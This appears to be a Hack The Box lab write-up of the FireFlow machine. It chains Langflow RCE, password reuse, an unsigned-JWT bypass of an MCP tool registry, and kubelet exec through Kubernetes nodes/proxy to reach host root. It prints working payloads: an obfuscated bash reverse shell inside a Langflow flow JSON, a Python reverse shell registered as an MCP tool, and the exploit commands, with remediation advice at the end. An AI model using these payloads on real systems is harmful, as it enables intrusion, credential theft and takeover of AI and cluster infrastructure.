@@ -1,0 +1,515 @@
+export const frontmatter = {
+  title: "Hack The Box FireFlow Machine Writeup",
+  slug: "hack-the-box-fireflow-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box FireFlow machine, covering unauthenticated Langflow remote code execution, credential discovery, MCP JWT authentication bypass, Kubernetes RBAC abuse, kubelet exploitation, and host compromise through a privileged container.",
+  date: "2026-07-07",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box FireFlow Writeup | Langflow RCE, MCP JWT Bypass & Kubernetes Privilege Escalation | loxcalhost",
+  description:
+    "Step-by-step Hack The Box FireFlow writeup demonstrating exploitation of Langflow CVE-2026-33017 for initial access, password reuse for SSH, JWT 'none' algorithm abuse in the MCP service, Kubernetes RBAC misconfigurations, kubelet command execution, and root access via a privileged node-exporter container.",
+};
+
+## Introduction
+
+FireFlow is a Linux-based machine focused on modern AI infrastructure and Kubernetes security. The challenge involves exploiting vulnerabilities across a Langflow application, an internal MCP service, and a Kubernetes cluster, ultimately leading to full compromise of the underlying host.
+
+## Overview
+
+The assessment began with web application enumeration, leading to the discovery of a vulnerable Langflow instance susceptible to unauthenticated remote code execution. Initial access exposed credentials that allowed SSH access to a legitimate user account. Further enumeration uncovered an insecure MCP service vulnerable to JWT authentication bypass, resulting in code execution within a Kubernetes pod. Finally, excessive Kubernetes RBAC permissions and a privileged container with the host filesystem mounted enabled access to the underlying host and complete system compromise.
+
+## Attack Chain
+
+1. Enumerated the target and discovered the `flow.fireflow.htb` virtual host.
+2. Identified the vulnerable Langflow (Flow Engine v1.8.2) instance.
+3. Exploited CVE-2026-33017 to achieve unauthenticated remote code execution as `www-data`.
+4. Retrieved the `LANGFLOW_SUPERUSER_PASSWORD` from environment variables.
+5. Reused the recovered password to obtain SSH access as the `nightfall` user.
+6. Discovered MCP credentials in `~/.mcp/config.json`.
+7. Forged an unsigned JWT by abusing acceptance of the `none` algorithm.
+8. Registered and executed a malicious MCP tool to gain code execution inside the Kubernetes pod.
+9. Enumerated the Kubernetes ServiceAccount permissions and identified access to `nodes/proxy`.
+10. Used the kubelet API to execute commands inside a privileged `node-exporter` pod.
+11. Leveraged the host filesystem mounted within the privileged container to access the host's root filesystem and obtain full system compromise.
+
+
+## Setup
+
+First, download the VPN configuration file from the platform and establish a connection using OpenVPN:
+```bash
+sudo openvpn machines_au-2.ovpn
+```
+
+To confirm that the target machine is reachable across the VPN, we can send a few ICMP echo requests:
+```bash
+$ ping -c 4 10.129.112.114
+
+PING 10.129.112.114 (10.129.112.114) 56(84) bytes of data.
+64 bytes from 10.129.112.114: icmp_seq=1 ttl=63 time=304 ms
+64 bytes from 10.129.112.114: icmp_seq=2 ttl=63 time=305 ms
+64 bytes from 10.129.112.114: icmp_seq=3 ttl=63 time=312 ms
+64 bytes from 10.129.112.114: icmp_seq=4 ttl=63 time=331 ms
+
+--- 10.129.112.114 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3003ms
+rtt min/avg/max/mdev = 304.384/313.142/330.715/10.574 ms
+```
+
+Navigating to the target IP address (`10.129.112.114`) in a web browser triggers an automatic redirect to `http://fireflow.htb`. However, the connection fails, and the page does not load.
+
+> **Note:** Because `fireflow.htb` is a private, unregistered domain, public DNS servers cannot resolve it. We must manually map the target IP to this hostname locally so our system knows where to route the request.
+
+We can resolve this by appending the IP and domain to our local `/etc/hosts` file:
+```bash
+echo '10.129.112.114    fireflow.htb' | sudo tee -a /etc/hosts
+```
+
+Once this entry is added, refreshing the browser allows the domain to resolve properly, granting us access to the web application.
+
+## Enumeration
+
+We begin our enumeration with a port scan using Nmap to identify open ports and the services running on the target machine:
+```bash
+$ nmap -sV 10.129.112.114
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-02 17:10 IST
+Nmap scan report for fireflow.htb (10.129.112.114)
+Host is up (0.32s latency).
+Not shown: 992 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE   VERSION
+22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+443/tcp   open     ssl/http  nginx
+9100/tcp  filtered jetdirect
+30000/tcp filtered ndmps
+30718/tcp filtered unknown
+30951/tcp filtered unknown
+31038/tcp filtered unknown
+31337/tcp filtered Elite
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 73.37 seconds
+```
+
+Based on the Nmap results, the target is running Ubuntu Linux and has two accessible ports and six filtered ports:
+- **Port 22 (ssh):** SSH Server
+- **Port 443 (http):** HTTP Server
+
+Next, enumerate virtual hosts using Gobuster:
+```bash
+$ gobuster vhost -u https://fireflow.htb -k -w ~/Desktop/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       https://fireflow.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /home/vinod/Desktop/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+flow.fireflow.htb Status: 200 [Size: 1142]
+Progress: 5000 / 5000 (100.00%)
+===============================================================
+Finished
+```
+
+The output reveals a new subdomain, `flow.fireflow.htb`. Add the entry to the `/etc/hosts` file so it resolves correctly during further enumeration.
+
+Navigating to `flow.fireflow.htb` redirects to the `/login` page. The application also provides a user registration option at the `/signup` endpoint, allowing new accounts to be created for further enumeration.
+
+After signing up and logging in, an external link at `https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25` points to **Langflow**, an open-source, Python-based framework for building customizable AI applications. This reveals part of the application's underlying technology stack and suggests that Langflow is being used to power its AI-related functionality.
+
+On `fireflow.htb`, the **Nightfall AI Agent** section reveals that the application is running **Flow Engine v1.8.2**. 
+
+## Foothold
+
+This version is vulnerable to [**CVE-2026-33017**](https://github.com/advisories/GHSA-vwmf-pq79-vjvx). The vulnerability exists because the `/api/v1/build_public_tmp/{flow_id}/flow` endpoint allows public flows to be built without requiring authentication. When the optional `data` parameter is supplied, the endpoint processes attacker-controlled flow definitions instead of the flow stored in the database. Since node definitions can contain arbitrary Python code, and that code is passed directly to `exec()` without any sandboxing or validation, an unauthenticated attacker can achieve remote code execution on the server.
+
+To exploit the vulnerability, save the following payload as `payload.json`:
+```json
+{
+  "data": {
+    "nodes": [
+      {
+        "id": "Exploit-001",
+        "type": "genericNode",
+        "position": {
+          "x": 0,
+          "y": 0
+        },
+        "data": {
+          "id": "Exploit-001",
+          "type": "ExploitComp",
+          "node": {
+            "template": {
+              "code": {
+                "type": "code",
+                "required": true,
+                "show": true,
+                "multiline": true,
+                "value": "from langflow.custom import Component\nfrom langflow.io import Output\n_r = __import__('os').system(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTUvOTAwMSAgMD4mMSAgICAK | base64 -d | bash\")\nclass ExploitComponent(Component):\n    display_name = \"ExploitComponent\"\n    outputs = [Output(display_name=\"Result\", name=\"output\", method=\"run\")]\n    def run(self) -> str: return \"ok\"",
+                "name": "code",
+                "password": false,
+                "advanced": false,
+                "dynamic": false
+              },
+              "_type": "Component"
+            },
+            "description": "X",
+            "base_classes": [
+              "Data"
+            ],
+            "display_name": "ExploitComp",
+            "name": "ExploitComp",
+            "frozen": false,
+            "outputs": [
+              {
+                "types": [
+                  "Data"
+                ],
+                "selected": "Data",
+                "name": "o",
+                "display_name": "O",
+                "method": "r",
+                "value": "__UNDEFINED__",
+                "cache": true,
+                "allows_loop": false,
+                "tool_mode": false,
+                "hidden": null,
+                "required_inputs": null,
+                "group_outputs": false
+              }
+            ],
+            "field_order": [
+              "code"
+            ],
+            "beta": false,
+            "edited": false
+          }
+        }
+      }
+    ],
+    "edges": []
+  },
+  "inputs": null
+}
+```
+
+Next, start a Netcat listener on your attack machine to receive the reverse shell:
+```bash
+nc -lvnp 9001
+```
+
+Finally, trigger the vulnerable endpoint by sending the malicious flow definition:
+```bash
+curl -k -H "Content-Type: application/json" -b "client_id=attacker" --data @payload.json "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow"
+```
+
+If the exploit is successful, the server executes the attacker-controlled Python code embedded in the supplied flow definition, resulting in a reverse shell connecting back to the Netcat listener.
+
+## Lateral Movement
+
+After obtaining a shell as the `www-data` user, inspect the environment variables:
+```bash
+www-data@fireflow:/var/lib/langflow$ env
+
+LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
+```
+
+Among the environment variables is `LANGFLOW_SUPERUSER_PASSWORD`, which contains the value `n1ghtm4r3_b4_n1ghtf4ll`. Since the `nightfall` account is the only user present under `/home`, the password is tested for reuse against SSH. Fortunately, the credentials are valid, providing a stable interactive shell as the `nightfall` user.
+
+## Further Lateral Movement
+
+The MCP configuration is stored in the user's home directory under `~/.mcp`. The configuration file, `config.json`, contains the MCP server details, including the server URL, status endpoint, and the authentication credentials required to connect to the MCP server.
+```bash
+nightfall@fireflow:~$ ls -la
+drwx------ 2 nightfall nightfall 4096 Jul  4 10:19 .mcp
+
+nightfall@fireflow:~$ cd .mcp
+
+nightfall@fireflow:~/.mcp$ cat config.json 
+{
+  "server": "http://10.129.112.114:30080",
+  "status_endpoint": "/api/v1/version",
+  "user": "langflow-bot",
+  "password": "Langfl0w@mcp2026!"
+}
+```
+
+Since the MCP service is only accessible locally on the target, we can expose it on our local machine using SSH local port forwarding with the `-L 30080:127.0.0.1:30080` option.
+
+Querying the `/api/v1/version` endpoint reveals information about the authentication mechanism supported by the MCP service:
+
+```json
+{
+  "service": "MCP AI Tool Registry",
+  "version": "0.1.0",
+  "auth": {
+    "type": "JWT",
+    "header": "Authorization: Bearer <token>",
+    "supported_algorithms": [
+      "HS256",
+      "none"
+    ]
+  },
+  "docs": "/docs",
+  "endpoints": [
+    "/mcp POST                        [MCP JSON-RPC 2.0]",
+    "POST /api/v1/auth",
+    "GET  /api/v1/tools",
+    "POST /api/v1/tools               [admin]"
+  ]
+}
+```
+
+Since the application uses JWT-based authentication and advertises support for the `none` signing algorithm, we can forge an unsigned JWT with arbitrary claims. By setting the appropriate role (e.g., `admin`) in the token payload, we can generate a malicious administrator token and use it to authenticate as an admin.
+
+Enumerate the available API endpoints:
+```bash
+$ curl http://localhost:30080/openapi.json -H "Authorization: Bearer $TOKEN" | jq
+
+{
+  "openapi": "3.1.0",
+  "info": {
+    "title": "MCP AI Tool Registry — Task Force Nightfall",
+    "version": "0.1.0"
+  },
+
+  "paths": {
+    ... [SNIP] ...
+
+    "/api/v1/tools": {
+      "post": {
+        "summary": "Register Tool",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/ToolRegisterRequest"
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "HTTPBearer": []
+          }
+        ]
+      }
+    },
+
+    "/mcp": {
+      "post": {
+        "summary": "Mcp Endpoint",
+        "security": [
+          {
+            "HTTPBearer": []
+          }
+        ]
+      }
+    }
+
+    ... [SNIP] ...
+  },
+
+  "components": {
+    "schemas": {
+      ... [SNIP] ...
+
+      "ToolRegisterRequest": {
+        "type": "object",
+        "required": [
+          "name",
+          "description",
+          "code"
+        ],
+        "properties": {
+          "name": {
+            "type": "string"
+          },
+          "description": {
+            "type": "string"
+          },
+          "inputSchema": {
+            "type": ["object", "null"]
+          },
+          "code": {
+            "type": "string"
+          }
+        }
+      }
+
+      ... [SNIP] ...
+    },
+
+    "securitySchemes": {
+      "HTTPBearer": {
+        "type": "http",
+        "scheme": "bearer"
+      }
+    }
+  }
+}
+```
+
+With administrative access, we can register arbitrary MCP tools. Since the `code` field accepts Python code that is executed when the tool is invoked, we can register a tool that establishes a reverse shell:
+```bash
+curl -X POST http://localhost:30080/api/v1/tools \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name":"rev",
+    "description":"test",
+    "code":"import os\nimport pty\nimport socket\n\ns = socket.socket()\ns.connect((\"10.10.14.39\", 9001))\n\nfor fd in (0, 1, 2):\n    os.dup2(s.fileno(), fd)\n\npty.spawn(\"/bin/sh\")\n"
+}'
+```
+
+Before invoking the tool, start a Netcat listener to receive the incoming connection:
+```bash
+nc -lvnp 9001
+```
+
+Once the tool has been registered, invoke it via the `/mcp` endpoint. This causes the server to execute the embedded Python code, resulting in a reverse shell connecting back to our listener:
+```bash
+curl -X POST http://localhost:30080/mcp \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "jsonrpc":"2.0",
+    "id":1,
+    "method":"tools/call",
+    "params":{
+      "name":"rev",
+      "arguments":{}
+    }
+  }'
+```
+
+Now, to upgrade the basic shell to a fully interactive TTY, execute the following stabilization steps:
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+## Privilege Escalation
+
+Inspecting the environment variables confirms that we are running inside a Kubernetes pod:
+```bash
+mcp@mcp-server-54464cb475-29ztf:/app$ env
+
+KUBERNETES_PORT=tcp://10.43.0.1:443
+KUBERNETES_SERVICE_PORT=443
+HOSTNAME=mcp-server-54464cb475-29ztf
+HOME=/home/mcp
+KUBERNETES_SERVICE_PORT_HTTPS=443
+KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
+KUBERNETES_SERVICE_HOST=10.43.0.1
+PWD=/app
+```
+
+Kubernetes automatically mounts a ServiceAccount token and CA certificate into each pod. We can export them for subsequent API requests:
+```bash
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+```
+
+Next, enumerate the permissions granted to the ServiceAccount using the `SelfSubjectRulesReview` API:
+```bash
+mcp@mcp-server-54464cb475-29ztf:/app$ curl -sk -X POST "https://$KUBERNETES_SERVICE_HOST:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
+
+{
+  "status": {
+    "resourceRules": [
+      {
+        "verbs": ["get"],
+        "apiGroups": [""],
+        "resources": ["nodes/proxy"]
+      },
+      ...[SNIP]...
+    ]
+  }
+}
+```
+
+Among the assigned permissions is `get` on the `nodes/proxy` resource. This permission is particularly dangerous because it allows proxying requests through the kubelet running on cluster nodes, which can often be leveraged to interact with privileged workloads or access sensitive endpoints. As described in Graham Helton's article, this can ultimately lead to cluster compromise if a privileged pod is present.
+
+This permission is particularly dangerous because it allows access to the kubelet API (port `10250`), which is typically reachable only from within the cluster and exposes endpoints capable of interacting with containers running on the node.
+
+To determine whether any privileged pods are running in the cluster, query the kubelet's `/pods` endpoint and filter the results for containers with `securityContext.privileged` set to `true`:
+```bash
+nightfall@fireflow:~$ curl -sk "https://10.129.112.114:10250/pods" \
+  -H "Authorization: Bearer $TOKEN" | jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | {
+  namespace: .metadata.namespace,
+  pod_name: .metadata.name,
+  container_name: .spec.containers[].name,
+  mount_paths: [.spec.containers[].volumeMounts[].mountPath]
+}'
+
+{
+  "namespace": "monitoring",
+  "pod_name": "prometheus-prometheus-node-exporter-nmntq",
+  "container_name": "node-exporter",
+  "mount_paths": [
+    "/host/proc",
+    "/host/sys",
+    "/host/root"
+  ]
+}
+```
+
+The `node-exporter` container is running in privileged mode and has the host filesystem mounted under `/host/root`, making it an ideal target for kubelet command execution.
+
+Using the `nodes/proxy` permission, we can execute commands inside the container via the kubelet's `/exec` endpoint:
+```bash
+nightfall@fireflow:~$ websocat --insecure \
+  --header "Authorization: Bearer $TOKEN" \
+  --protocol v4.channel.k8s.io \
+  "wss://10.129.112.114:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=id"
+
+uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
+{"metadata":{},"status":"Success"}
+```
+
+The host's root filesystem is mounted inside the privileged container, in this case under `/host/root`, allowing us to access files from the underlying host.
+
+Since the host's root filesystem is mounted at `/host/root`, we can read the root flag directly:
+```bash
+nightfall@fireflow:~$ websocat --insecure \
+  --header "Authorization: Bearer $TOKEN" \
+  --protocol v4.channel.k8s.io \
+  "wss://10.129.112.114:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=cat&command=/host/root/root/root.txt"
+```
+
+## Remediation & Recommendations
+
+The following recommendations should be implemented to mitigate the vulnerabilities identified during this assessment:
+
+- **Upgrade Langflow** to a version that addresses CVE-2026-33017 and apply security updates promptly.
+- **Disable or restrict public flow execution endpoints** unless explicitly required by the application.
+- **Avoid executing user-supplied Python code** using functions such as `exec()`. If dynamic code execution is required, use a secure sandboxed environment.
+- **Store secrets securely** using a dedicated secrets management solution instead of exposing credentials through environment variables.
+- **Rotate all exposed credentials** and enforce unique passwords across services to prevent credential reuse.
+- **Reject JWTs using the `none` algorithm** and enforce signature verification using approved signing algorithms.
+- **Restrict access to MCP administrative functionality**, ensuring that only authorized administrators can register or execute custom tools.
+- **Validate and sandbox custom AI components** to prevent arbitrary code execution through user-defined workflows or plugins.
+- **Apply the Principle of Least Privilege** when assigning Kubernetes RBAC permissions to ServiceAccounts.
+- **Remove unnecessary `nodes/proxy` permissions**, as they can be leveraged to access kubelet APIs and privileged workloads.
+- **Avoid running privileged containers** unless absolutely necessary and prevent mounting the host filesystem into containers.
+- **Enable Kubernetes Pod Security Admission** (or an equivalent policy) to restrict privileged pod creation.
+- **Secure the kubelet API** by limiting access to trusted components and enforcing authentication and authorization.
+- **Enable centralized logging and monitoring** for authentication events, Kubernetes API activity, privileged container execution, and suspicious code execution within AI services.
+- **Perform regular security assessments** of AI frameworks, Kubernetes infrastructure, and application dependencies to identify vulnerabilities before deployment.
